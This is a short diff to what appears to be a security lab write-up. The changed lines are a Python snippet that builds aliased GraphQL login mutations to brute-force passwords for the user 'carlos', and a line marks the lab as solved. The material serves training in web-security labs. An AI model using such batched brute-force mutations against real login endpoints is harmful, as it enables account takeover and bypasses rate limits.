@@ -582,9 +582,8 @@ passwords = "123456,password,12345678,qwerty".split(',')
 
 mutations = []
 for index, element in enumerate(passwords):
-    # Escape curly braces by doubling them
     mutation = (
-        f"bruteforce{index}: login(input: {{{{ password: \"{element}\", username: \"carlos\" }}}}) {{\n"
+        f"bruteforce{index}: login(input: &#123; password: \"{element}\", username: \"carlos\" &#125;) {{\n"
         "    token\n"
         "    success\n"
         "}\n"
@@ -679,6 +678,7 @@ Store and deliver to victum and lab is solved
 
 
 ---
+
 
 
 
